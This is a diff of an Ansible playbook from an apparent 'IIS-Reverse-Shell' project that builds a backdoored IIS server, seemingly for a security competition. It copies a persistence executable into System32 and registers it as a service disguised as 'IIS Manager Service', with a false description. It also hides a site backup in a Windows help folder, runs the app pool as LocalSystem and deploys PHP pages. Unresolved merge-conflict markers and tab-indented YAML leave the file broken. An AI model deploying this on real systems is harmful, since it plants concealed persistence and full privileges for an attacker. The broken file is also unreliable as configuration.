@@ -2,7 +2,7 @@
   hosts: all
   gather_facts: true
   vars:
-    Competition: "UB_Lockdown"
+    Competition: "Empire State Health"
 
   tasks:
     - name: Installs IIS Web Service Features
@@ -29,28 +29,37 @@
       win_file:
         path: "C:\\vc_redist.x64.exe"
         state: absent
+
+    - name: Removes the Default IIS Website
+      win_iis_website:
+        name: "Default Web Site"
+        state: absent
+        
+    - name: Removes Default Application Pool
+      win_iis_webapppool:
+        name: "DefaultAppPool"
+        state: absent
+
+    - name: Creates IIS Web Root Directory
+      win_file:
+        path: "C:\\inetpub\\{{ Competition }}"
+        state: directory
+
+    - name: Creates a New IIS Website
+      win_iis_website:
+        name: "{{ Competition }}"
+        state: started
+        physical_path: "C:\\inetpub\\{{ Competition }}"
+        port: 80
+        ip: "*"
         
     - name: Deploys Website Images
       win_copy:
         src: "~/IIS-Reverse-Shell/Images/{{ Competition }}/"
-        dest: "C:\\inetpub\\wwwroot\\Images"
+        dest: "C:\\inetpub\\{{ Competition }}\\Images"
         
     - name: Deploys index.html
       win_copy:
-<<<<<<< HEAD
-        src: "~/IIS-Reverse-Shell/Website/{{ Competition }}.html"
-        dest: "C:\\inetpub\\wwwroot"
-        
-    - name: Deploys web.config
-      win_copy:
-        src: "~/IIS-Reverse-Shell/Website/web.config"
-        dest: "C:\\inetpub\\wwwroot"
-        
-    - name: Deploys button.js
-      win_copy:
-        src: "~/IIS-Reverse-Shell/Website/button.js"
-        dest: "C:\\inetpub\\wwwroot"
-=======
         src: "~/IIS-Reverse-Shell/Website/{{Competition}}/{{ Competition }}.html"
         dest: "C:\\inetpub\\{{ Competition }}"
         
@@ -63,58 +72,34 @@
       win_copy:
         src: "~/IIS-Reverse-Shell/Website/{{Competition}}/button.js"
         dest: "C:\\inetpub\\{{ Competition }}"
->>>>>>> f630eceab4685153ce53579793f0422b80df086e
     
     - name: Deploys search.php
       win_copy:
         src: "~/IIS-Reverse-Shell/PHP/search.php"
-        dest: "C:\\inetpub\\wwwroot\\search.php"
+        dest: "C:\\inetpub\\{{ Competition }}\\search.php"
 
     - name: Deploys contact.php
       win_copy:
         src: "~/IIS-Reverse-Shell/PHP/contact.php"
-        dest: "C:\\inetpub\\wwwroot\\contact.php"
+        dest: "C:\\inetpub\\{{ Competition }}\\contact.php"
         
     - name: Backup Website Contents
-      win_shell: Copy-Item -Path "C:\inetpub\wwwroot" -Destination "C:\Windows\Help\Help" -Recurse -Force
+      win_shell: Copy-Item -Path "C:\inetpub\{{ Competition }}" -Destination "C:\Windows\Help\Help" -Recurse -Force
       
     - name: Deploys Persistence Executable
       win_copy:
         src: "~/IIS-Reverse-Shell/Persistence/IISManagerService.exe"
         dest: "C:\\Windows\\System32"
      
-    - name: Creates IIS_Folder_Name Variable Registry Key
+    - name: Creates Competition Variable Registry Key
       win_regedit:
-<<<<<<< HEAD
-      	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
-      	name: IIS_Folder_Name
-      	data: "{{ IIS_Folder_Name }}"
-      	type: string
-
-    - name: Creates IIS_Site_Name Variable Registry Key
-      win_regedit:
-      	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
-      	name: IIS_Site_Name
-      	data: "{{ IIS_Site_Name }}"
-      	type: string
-
-    - name: Creates IIS_AppPool Variable Registry Key
-      win_regedit:
-      	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
-      	name: IIS_AppPool
-      	data: "{{ IIS_AppPool }}"
-      	type: string
-      	
-=======
         path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
         name: Competition
         data: "{{ Competition }}"
         type: string
         
->>>>>>> f630eceab4685153ce53579793f0422b80df086e
     - name: Adds Executable to Services
       win_shell:  New-Service -Name "webmgrsvc" -Binary "C:\Windows\System32\IISManagerService.exe" -DisplayName "IIS Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
-      ignore_errors: yes
         
     - name: Starts Service
       win_service:
@@ -137,7 +122,7 @@
         
     - name: Downloads PHP
       win_get_url:
-        url: "https://windows.php.net/downloads/releases/php-8.4.6-nts-Win32-vs17-x64.zip"
+        url: "https://windows.php.net/downloads/releases/php-8.4.5-nts-Win32-vs17-x64.zip"
         dest: "C:\\Program Files\\php.zip"
         
     - name: Extracts PHP to Program Files
@@ -162,10 +147,17 @@
       
     - name: Set Application Pool to LocalSystem
       win_iis_webapppool:
-        name: DefaultAppPool
+        name: "{{ Competition }}"
         state: started
         attributes:
           processModel.identityType: LocalSystem
+          
+    - name: Assign Application Pool to Website
+      win_iis_website:
+        name: "{{ Competition }}"
+        application_pool: "{{ Competition }}"
+        state: started
+        physical_path: "C:\\inetpub\\{{ Competition }}"
 
     - name: Restarts IIS
       win_shell: iisreset /restart
